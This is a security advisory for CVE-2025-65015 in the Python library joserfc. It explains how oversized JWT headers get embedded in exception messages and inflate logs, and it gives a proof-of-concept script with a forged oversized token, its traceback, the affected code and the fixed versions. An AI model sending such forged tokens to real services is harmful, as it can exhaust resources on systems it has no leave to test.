# [C] joserfc has Possible Uncontrolled Resource Consumption Vulnerability Triggered by Logging Arbitrarily Large JWT Token Payloads

## Summary
Severity: Critical
Advisory: GHSA-frfh-8v73-gjg4
CVE: CVE-2025-65015
CWE: CWE-770
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:H (CVSS_V4)
Published: 2025-11-18
Source: https://github.com/advisories/GHSA-frfh-8v73-gjg4
Type: github-advisory

## Affected
- PyPI: `joserfc` — affected >=1.3.3 <1.3.5
- PyPI: `joserfc` — affected >=1.4.0 <1.4.2

## Details
### Summary
The `ExceededSizeError` exception messages are embedded with non-decoded JWT token parts and may cause Python logging to record an arbitrarily large, forged JWT payload.

### Details
In situations where a misconfigured — or entirely absent — production-grade web server sits in front of a Python web application, an attacker may be able to send arbitrarily large bearer tokens in the HTTP request headers. When this occurs, Python logging or diagnostic tools (e.g., Sentry) may end up processing extremely large log messages containing the full JWT header during the `joserfc.jwt.decode()` operation. The same behavior also appears when validating claims and signature payload sizes, as the library raises `joserfc.errors.ExceededSizeError()` with the full payload embedded in the exception message. Since the payload is already fully loaded into memory at this stage, the library cannot prevent or reject it per se.

It is therefore the responsibility of the underlying web server (`uvicorn`/`h11`, `gunicorn`, `Starlette`, `Werkzeug`, `nginx`...etc) to enforce limits on header sizes. For example, a `FastAPI`/`Starlette` application running _without_ `uvicorn` and/or `gunicorn` cannot enforce header size limits on its own. With `uvicorn`/`h11`, the [--h11-max-incomplete-event-size <int>](https://uvicorn.dev/settings/#implementation:~:text=%2D%2Dh11%2Dmax%2Dincomplete%2Devent%2Dsize%20%3Cint%3E) option can restrict the total size of the header _plus_ body, but not the header alone. Similarly, [vLLM serve](https://docs.vllm.ai/en/latest/cli/serve/#-h11-max-incomplete-event-size) —due to its reliance on `uvicorn`/`h11` and the need for heavy data transfer in ML inference workloads, sets a default limit of 4 MB for header _plus_ body and is frequently increased. In practice, a robust reverse proxy (such as `nginx`) is typically required because it can explicitly cap maximum header size. Unfortunately, many web applications do not run behind a proper reverse proxy.

Given these constraints, the `joserfc` library cannot safely log or embed payloads of arbitrary size. This issue is particularly subtle, as it occurs only when a maliciously crafted JWT finally reaches the Python application, a scenario that most developers will never encounter during routine development and testing.

### PoC
**Environment**
Ubuntu 24.04 LTS
Python 3.12
Tested on `joserfc` version `1.4.1`

```python

import logging
from datetime import UTC, datetime, timedelta

from joserfc import jwt
from joserfc.errors import ExceededSizeError, UnsupportedAlgorithmError
from joserfc.jwk import OctKey


logger = logging.getLogger(__name__)


SECRET_KEY = "8c13bd66babc241b29f8553429bdab7deb6f5b74ddfda7765471e57ecd55641e"
LONG_JWT_TOKEN = (
    "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NmRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRSUzI1NmRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRSUzI1NmRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRSUzI1NmRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRSUzI1NmRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRSUzI1NmRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGQifQ"
    "."
    "eyJpc3MiOiJhdXRoX3NlcnZlciIsImlhdCI6MTc2MzI0OTEwMSwiZXhwIjoxNzY5MjQ5MTAxfQ"
    "."
    "6-k2jmkGXD6wXOgYgjPS8E5lS_GjWpgIuY54gokjAn8"
)

HEADER = {
    "alg": (
        "RS256dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd"
        "RS256dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd"
        "RS256dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd"
        "RS256dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd"
        "RS256dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd"
        "RS256dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd"
    ),
}
CLAIMS = {
    "iss": "auth_server",
    "iat": datetime.now(UTC),
    "exp": datetime.now(UTC) + timedelta(minutes=15),
}


def main():
    # Create OctKey from SECRET_KEY
    key = OctKey.import_key(SECRET_KEY)

    # Simulate creating a very large JWT
    # (this will fail with joserfc.errors.UnsupportedAlgorithmError
    # due to an invalid 'alg' header content
    try:
        token = jwt.encode(HEADER, CLAIMS, key)
    except UnsupportedAlgorithmError:
        # Use a forged token that has the same header and claims instead
        # but an invalid signature
        token = LONG_JWT_TOKEN
    logger.warning(f"Created JWT: {token}")

    # Now try to decode the large JWT
    try:
        decoded_token = jwt.decode(token, key)
        logger.warning("This line will never be reached.")
        logger.warning(decoded_token.claims)
    except ExceededSizeError:
        logger.exception(
            "The JWT size is too large and may be a security attack attempt."
        )
        # this is logging the whole header content in the exception message!

```
```
Created JWT: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NmRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRSUzI1NmRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRSUzI1NmRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRSUzI1NmRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRSUzI1NmRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRSUzI1NmRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGQifQ.eyJpc3MiOiJhdXRoX3NlcnZlciIsImlhdCI6MTc2MzI0OTEwMSwiZXhwIjoxNzY5MjQ5MTAxfQ.6-k2jmkGXD6wXOgYgjPS8E5lS_GjWpgIuY54gokjAn8
The JWT size is too large and may be a security attack attempt.
Traceback (most recent call last):
  File "security_issue.py", line 55, in main
    claims = jwt.decode(token, key)
             ^^^^^^^^^^^^^^^^^^^^^^
  File ".venv/lib/python3.12/site-packages/joserfc/jwt.py", line 106, in decode
    header, payload = _decode_jws(_value, key, algorithms, registry)
                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ".venv/lib/python3.12/site-packages/joserfc/jwt.py", line 127, in _decode_jws
    jws_obj = deserialize_compact(value, key, algorithms, registry)
              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ".venv/lib/python3.12/site-packages/joserfc/jws.py", line 183, in deserialize_compact
    obj = extract_compact(to_bytes(value), payload, registry)
          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ".venv/lib/python3.12/site-packages/joserfc/_rfc7797/compact.py", line 50, in extract_rfc7515_compact
    registry.validate_header_size(header_segment)
  File ".venv/lib/python3.12/site-packages/joserfc/_rfc7515/registry.py", line 104, in validate_header_size
    raise ExceededSizeError(f"Header size of '{header!r}' exceeds {self.max_header_length} bytes.")
joserfc.errors.ExceededSizeError: exceeded_size: Header size of 'b'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NmRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRSUzI1NmRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRSUzI1NmRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRSUzI1NmRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRSUzI1NmRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRSUzI1NmRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGQifQ'' exceeds 512 bytes.

```

## Code location
This behavior occurs in:

**`joserfc/_rfc7515/registry.py`**
**L102-112**
```python
    def validate_header_size(self, header: bytes) -> None:
        if header and len(header) > self.max_header_length:
            raise ExceededSizeError(f"Header size of '{header!r}' exceeds {self.max_header_length} bytes.")

    def validate_payload_size(self, payload: bytes) -> None:
        if payload and len(payload) > self.max_payload_length:
            raise ExceededSizeError(f"Payload size of '{payload!r}' exceeds {self.max_payload_length} bytes.")

    def validate_signature_size(self, signature: bytes) -> None:
        if len(signature) > self.max_signature_length:
            raise ExceededSizeError(f"Signature of '{signature!r}' exceeds {self.max_signature_length} bytes.")
```
**`joserfc/_rfc7516/registry.py`**
**L103-123**
```python
    def validate_protected_header_size(self, header: bytes) -> None:
        if header and len(header) > self.max_protected_header_length:
            raise ExceededSizeError(f"Header size of '{header!r}' exceeds {self.max_protected_header_length} bytes.")

    def validate_encrypted_key_size(self, ek: bytes) -> None:
        if ek and len(ek) > self.max_encrypted_key_length:
            raise ExceededSizeError(f"Encrypted key size of '{ek!r}' exceeds {self.max_encrypted_key_length} bytes.")

    def validate_initialization_vector_size(self, iv: bytes) -> None:
        if iv and len(iv) > self.max_initialization_vector_length:
            raise ExceededSizeError(
                f"Initialization vector size of '{iv!r}' exceeds {self.max_initialization_vector_length} bytes."
            )

    def validate_ciphertext_size(self, ciphertext: bytes) -> None:
        if ciphertext and len(ciphertext) > self.max_ciphertext_length:
            raise ExceededSizeError(f"Ciphertext size of '{ciphertext!r}' exceeds {self.max_ciphertext_length} bytes.")

    def validate_auth_tag_size(self, tag: bytes) -> None:
        if tag and len(tag) > self.max_auth_tag_length:
            raise ExceededSizeError(f"Auth tag size of '{tag!r}' exceeds {self.max_auth_tag_length} bytes.")
```
Another occurrence of `ExceededSizeError` in **`joserfc/_rfc7518/jwe_zips.py`** is not affected
by this issue as it does not include the payload content in the exception message.

### Impact
In scenarios where a web application does not reject excessively large HTTP header payloads, using `joserfc` can expose the system to an **Allocation of Resources Without Limits or Throttling** (CWE-770), potentially impacting disk, memory, and CPU on the application host, as well as any external log storage, ingestion pipelines or alerting services. This risk can be mitigated by removing the JWT payload from the logged content in some `joserfc.errors.ExceededSizeError()` exception message occurrences. It would also be beneficial for the documentation to advise deploying the library behind a robust web server or reverse proxy that correctly enforces maximum request header sizes.

## References
- https://github.com/authlib/joserfc/security/advisories/GHSA-frfh-8v73-gjg4
- https://nvd.nist.gov/vuln/detail/CVE-2025-65015
- https://github.com/authlib/joserfc/commit/63932f169d924caffafa761af2122b82059017f7
- https://github.com/authlib/joserfc/commit/673c8743fd0605b0e1de6452be6cba75f44e466b
- https://github.com/authlib/joserfc
- https://github.com/authlib/joserfc/releases/tag/1.3.5
- https://github.com/authlib/joserfc/releases/tag/1.4.2
